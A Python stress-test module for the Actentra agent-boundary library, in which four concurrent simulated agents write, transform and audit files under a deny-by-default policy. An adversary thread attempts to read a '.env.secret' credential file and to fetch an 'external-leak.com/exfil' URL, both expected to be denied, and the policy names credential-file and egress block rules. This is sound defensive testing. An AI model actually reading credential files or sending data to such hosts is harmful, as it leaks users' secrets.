"""Real-time concurrent multi-agent simulation and stress test for Actentra.

Simulates multiple autonomous AI agents operating concurrently against a shared
workspace and SQLite WAL receipt database:
1. Agent 1 (Ingest): Concurrently acquires exclusive leases on batch files, writes
   data with automatic postcondition verification, and releases leases.
2. Agent 2 (Transform): Concurrently attempts competing writes (proving conflict
   locking rejects concurrent mutations), waits for release, acquires its own lease,
   reads input, writes transformed output with postconditions, and creates causal links.
3. Agent 3 (Auditor): Concurrently runs non-blocking state verifications on the
   workspace in real time, validating file digests, freshness, and generating
   externally_verified evidence records.
4. Agent 4 (Adversary): Concurrently attempts sensitive path escapes (.env),
   violating lease boundaries, and executing untrusted network egress, verifying
   that Actentra's deterministic boundary fails closed in real time under concurrent load.
"""

from __future__ import annotations

import tempfile
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from actentra.boundary import ActionBlockedError, Boundary
from actentra_core.canonicalize import canonicalize_windows_path
from actentra_core.envelope import ProvenanceItem
from actentra_core.policy import load_policy_yaml
from actentra_core.receipts import ReceiptStore, VerificationResult, verify_log
from actentra_core.verdict import Verdict
from actentra_executors.verifiers import WorkspaceFileVerifier

_REALTIME_POLICY_YAML = """\
version: 1
policy_id: realtime-multiagent-sim-v1
mode: enforce

defaults:
  verdict: deny
  reason: "Denied by default: action not explicitly permitted"

limits:
  - id: agent-rate-limit
    scope: session
    max_actions_per_minute: 600

rules:
  - id: block-sensitive-env
    match:
      resource: "path:**/.env*"
    verdict: deny
    reason: "Access to credential files is strictly blocked"

  - id: block-untrusted-egress
    match:
      taint: untrusted
      tool: "http.*"
    verdict: deny
    reason: "Untrusted agents are strictly blocked from external network egress"

  - id: allow-fs-reads
    match:
      tool: "fs.read"
      verb: read
    verdict: allow
    reason: "Allow safe workspace file reads"

  - id: allow-fs-writes
    match:
      tool: "fs.write"
      verb: write
    verdict: allow
    reason: "Allow safe workspace file writes"
"""


@dataclass
class AgentLiveStats:
    """Live performance and decision stats for an individual agent."""

    name: str
    operations_attempted: int = 0
    operations_succeeded: int = 0
    conflicts_encountered: int = 0
    policy_denials_encountered: int = 0
    postconditions_verified: int = 0
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "attempted": self.operations_attempted,
            "succeeded": self.operations_succeeded,
            "conflicts_prevented": self.conflicts_encountered,
            "policy_denials": self.policy_denials_encountered,
            "postconditions_verified": self.postconditions_verified,
            "errors_count": len(self.errors),
        }


@dataclass(frozen=True, slots=True)
class RealtimeMultiagentResult:
    """Summary of real-time concurrent multi-agent simulation."""

    ok: bool
    workspace_dir: str
    db_path: str
    num_agents: int
    total_operations: int
    total_conflicts_prevented: int
    total_policy_denials: int
    total_postconditions_verified: int
    agent_stats: dict[str, dict[str, Any]]
    verification: VerificationResult
    elapsed_seconds: float


def run_realtime_multiagent_simulation(
    *,
    workspace_root: str | Path | None = None,
    db_file: str | Path | None = None,
    num_cycles: int = 5,
    verbose: bool = True,
    echo_fn: Callable[[str], None] | None = None,
) -> RealtimeMultiagentResult:
    """Execute live, concurrent real-time multi-agent execution test."""
    echo = echo_fn or print
    temp_ctx = None
    if workspace_root is None:
        temp_ctx = tempfile.TemporaryDirectory(prefix="actentra_realtime_sim_")
        ws_path = Path(temp_ctx.name).resolve()
    else:
        ws_path = Path(workspace_root).resolve()
        ws_path.mkdir(parents=True, exist_ok=True)

    db_path = (
        Path(db_file).resolve() if db_file is not None else (ws_path / "realtime_sim.db").resolve()
    )

    data_dir = ws_path / "data"
    processed_dir = ws_path / "processed"
    data_dir.mkdir(parents=True, exist_ok=True)
    processed_dir.mkdir(parents=True, exist_ok=True)

    if verbose:
        echo("=== Actentra Real-Time Concurrent Multi-Agent Simulation ===")
        echo(f"Workspace: {ws_path}")
        echo(f"Database:  {db_path}")
        echo(f"Cycles:    {num_cycles} operations per agent thread")

    policy = load_policy_yaml(_REALTIME_POLICY_YAML)
    shared_store = ReceiptStore(db_path)
    file_verifier = WorkspaceFileVerifier(ws_path)

    stats: dict[str, AgentLiveStats] = {
        "ingest_agent": AgentLiveStats(name="ingest_agent"),
        "transform_agent": AgentLiveStats(name="transform_agent"),
        "auditor_agent": AgentLiveStats(name="auditor_agent"),
        "adversary_agent": AgentLiveStats(name="adversary_agent"),
    }

    start_barrier = threading.Barrier(4)
    sim_start_time = time.time()

    # Synchronization events ensuring deterministic conflict detection across thread scheduling
    ingest_holding_lease = [threading.Event() for _ in range(num_cycles)]
    conflict_checked = [threading.Event() for _ in range(num_cycles)]

    # --- Agent 1: Ingest Agent Thread ---
    def _ingest_worker() -> None:
        st = stats["ingest_agent"]
        b = Boundary(
            policy=policy,
            receipt_store=shared_store,
            session_id="session-ingest",
            agent_id="agent_ingest",
            verifier=file_verifier,
        )
        start_barrier.wait()
        for i in range(num_cycles):
            st.operations_attempted += 1
            filename = f"batch_{i:03d}.json"
            target_file = data_dir / filename
            res_str = f"path:{canonicalize_windows_path(str(target_file))}"

            try:
                # 1. Acquire exclusive lease on file
                lease = b.acquire_lease(res_str, mode="exclusive", ttl_seconds=30.0)
                ingest_holding_lease[i].set()
                # 2. Perform write with automatic postcondition verification
                content = f'{{"batch_id": {i}, "records": 100, "status": "raw"}}'

                def _write_action(
                    _env: Any,
                    _dec: Any,
                    _target: Path = target_file,
                    _text: str = content,
                ) -> int:
                    _target.write_text(_text, encoding="utf-8")
                    return len(_text)

                b.execute(
                    tool="fs.write",
                    verb="write",
                    resource=res_str,
                    fn=_write_action,
                    verify_postcondition=True,
                    postcondition_claim="exists",
                )
                st.operations_succeeded += 1
                st.postconditions_verified += 1
                # Wait for transform agent to test competing write while lease is held
                conflict_checked[i].wait(timeout=1.0)
                # 3. Release lease
                b.release_lease(lease.lease_id)
            except Exception as exc:
                st.errors.append(f"Ingest cycle {i} error: {exc}")
                ingest_holding_lease[i].set()

    # --- Agent 2: Transform Agent Thread ---
    def _transform_worker() -> None:
        st = stats["transform_agent"]
        b = Boundary(
            policy=policy,
            receipt_store=shared_store,
            session_id="session-transform",
            agent_id="agent_transform",
            verifier=file_verifier,
        )
        start_barrier.wait()
        for i in range(num_cycles):
            st.operations_attempted += 1
            in_file = data_dir / f"batch_{i:03d}.json"
            out_file = processed_dir / f"processed_{i:03d}.json"
            in_res = f"path:{canonicalize_windows_path(str(in_file))}"
            out_res = f"path:{canonicalize_windows_path(str(out_file))}"

            # Step A: Wait for ingest agent to acquire lease, then attempt competing write
            if ingest_holding_lease[i].wait(timeout=2.0):
                try:
                    b.execute(
                        tool="fs.write",
                        verb="write",
                        resource=in_res,
                        fn=lambda _env, _dec: None,
                    )
                except ActionBlockedError as exc:
                    if exc.decision.rule_id == "coordination:resource-locked":
                        # Conflict successfully detected and prevented!
                        st.conflicts_encountered += 1
                except Exception as exc:
                    st.errors.append(f"Unexpected conflict error: {exc}")
                finally:
                    conflict_checked[i].set()

            # Step B: Wait for file to become available and transformed
            retries = 0
            while not in_file.exists() and retries < 50:
                time.sleep(0.02)
                retries += 1

            if in_file.exists():
                try:
                    # Read input file
                    def _read_in(_env: Any, _dec: Any, _p: Path = in_file) -> str:
                        return _p.read_text(encoding="utf-8")

                    read_content = b.execute(
                        tool="fs.read",
                        verb="read",
                        resource=in_res,
                        fn=_read_in,
                    )

                    # Acquire lease on output
                    out_lease = b.acquire_lease(out_res, mode="exclusive", ttl_seconds=30.0)

                    # Write processed output
                    proc_content = f'{{"source": {read_content!r}, "processed": true}}'

                    def _write_proc(
                        _env: Any,
                        _dec: Any,
                        _target: Path = out_file,
                        _text: str = proc_content,
                    ) -> int:
                        _target.write_text(_text, encoding="utf-8")
                        return len(_text)

                    b.execute(
                        tool="fs.write",
                        verb="write",
                        resource=out_res,
                        fn=_write_proc,
                        verify_postcondition=True,
                    )
                    st.operations_succeeded += 1
                    st.postconditions_verified += 1
                    b.release_lease(out_lease.lease_id)
                except Exception as exc:
                    st.errors.append(f"Transform cycle {i} error: {exc}")

    # --- Agent 3: Auditor Agent Thread ---
    def _auditor_worker() -> None:
        st = stats["auditor_agent"]
        b = Boundary(
            policy=policy,
            receipt_store=shared_store,
            session_id="session-auditor",
            agent_id="agent_auditor",
            verifier=file_verifier,
        )
        start_barrier.wait()
        for i in range(num_cycles):
            st.operations_attempted += 1
            time.sleep(0.03)  # Sample across active writes
            try:
                # Find all currently existing files in data or processed
                for check_dir in (data_dir, processed_dir):
                    for p in check_dir.glob("*.json"):
                        res_p = f"path:{canonicalize_windows_path(str(p))}"
                        obs = b.verify_state(res_p, claim="exists")
                        if obs.status == "verified":
                            st.postconditions_verified += 1
                st.operations_succeeded += 1
            except Exception as exc:
                st.errors.append(f"Auditor cycle {i} error: {exc}")

    # --- Agent 4: Adversary Agent Thread ---
    def _adversary_worker() -> None:
        st = stats["adversary_agent"]
        b = Boundary(
            policy=policy,
            receipt_store=shared_store,
            session_id="session-adversary",
            agent_id="agent_adversary",
        )
        start_barrier.wait()
        for _cycle in range(num_cycles):
            st.operations_attempted += 1
            # 1. Attempt sensitive file access (.env.secret)
            try:
                b.execute(
                    tool="fs.read",
                    verb="read",
                    resource="path:C:/workspace/.env.secret",
                    fn=lambda env, dec: "leak",
                )
            except ActionBlockedError as exc:
                if exc.decision.verdict == Verdict.DENY:
                    st.policy_denials_encountered += 1
            except Exception as exc:
                st.errors.append(f"Adversary sensitive path error: {exc}")

            # 2. Attempt untrusted egress
            try:
                b.execute(
                    tool="http.fetch",
                    verb="read",
                    resource="https://external-leak.com/exfil",
                    provenance=[ProvenanceItem(source="session", trust="untrusted")],
                    fn=lambda env, dec: "exfil",
                )
            except ActionBlockedError as exc:
                if exc.decision.verdict == Verdict.DENY:
                    st.policy_denials_encountered += 1
            except Exception as exc:
                st.errors.append(f"Adversary egress error: {exc}")

            st.operations_succeeded += 1
            time.sleep(0.02)

    # Launch concurrent threads
    t_ingest = threading.Thread(target=_ingest_worker, name="sim-ingest")
    t_transform = threading.Thread(target=_transform_worker, name="sim-transform")
    t_auditor = threading.Thread(target=_auditor_worker, name="sim-auditor")
    t_adversary = threading.Thread(target=_adversary_worker, name="sim-adversary")

    threads = [t_ingest, t_transform, t_auditor, t_adversary]
    for t in threads:
        t.start()

    for t in threads:
        t.join(timeout=30.0)

    elapsed = time.time() - sim_start_time

    # Verify log integrity after concurrent executions
    vr = verify_log(db_path)

    total_ops = sum(s.operations_attempted for s in stats.values())
    total_conflicts = sum(s.conflicts_encountered for s in stats.values())
    total_denials = sum(s.policy_denials_encountered for s in stats.values())
    total_verified = sum(s.postconditions_verified for s in stats.values())
    all_ok = vr.ok and total_conflicts > 0 and total_denials > 0

    if verbose:
        echo(f"\nSimulation finished in {elapsed:.2f}s:")
        echo(f"  • Total Operations:          {total_ops}")
        echo(f"  • Total Receipts Logged:     {vr.total_records}")
        echo(f"  • Conflicts Blocked (Locks): {total_conflicts}")
        echo(f"  • Policy Denials (Security): {total_denials}")
        echo(f"  • Postconditions Verified:   {total_verified}")
        echo(f"  • WAL Hash-Chain Integrity:  {'OK (PASS)' if vr.ok else 'FAILED'}")
        for s in stats.values():
            echo(
                f"    - [{s.name}]: ops={s.operations_attempted}, "
                f"succ={s.operations_succeeded}, errs={len(s.errors)}"
            )

    return RealtimeMultiagentResult(
        ok=all_ok,
        workspace_dir=str(ws_path),
        db_path=str(db_path),
        num_agents=4,
        total_operations=total_ops,
        total_conflicts_prevented=total_conflicts,
        total_policy_denials=total_denials,
        total_postconditions_verified=total_verified,
        agent_stats={k: v.to_dict() for k, v in stats.items()},
        verification=vr,
        elapsed_seconds=elapsed,
    )
